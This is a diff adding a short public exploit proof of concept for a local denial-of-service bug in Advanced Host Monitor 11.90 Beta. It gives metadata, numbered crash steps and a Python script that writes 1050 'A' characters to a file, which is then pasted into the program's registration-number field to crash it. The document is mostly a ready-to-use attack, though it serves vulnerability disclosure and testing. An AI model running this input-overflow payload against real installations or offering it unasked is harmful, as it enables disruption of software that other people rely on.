@@ -1,0 +1,26 @@
+# Exploit Title: Advanced Host Monitor 11.90 Beta - 'Registration number' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2019-01-30
+# Vendor Homepage: https://www.ks-soft.net
+# Software Link : https://www.ks-soft.net/download/hm1190.exe
+# Tested Version: 11.90 Beta
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python Advanced_Host_Monitor_11.90_Beta.py
+# 2.- Open Advanced_Host_Monitor_11.90_Beta.txt and copy content to clipboard
+# 3.- Open HostMonitor
+# 4.- Help -> License...
+# 5.- Register Now
+# 6.- Name (Organization): -> l4m5
+# 7.- Paste ClipBoard on "Registration number:"
+# 8.- OK
+# 9.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 1050
+f = open ("Advanced_Host_Monitor_11.90_Beta.txt", "w")
+f.write(buffer)
+f.close()
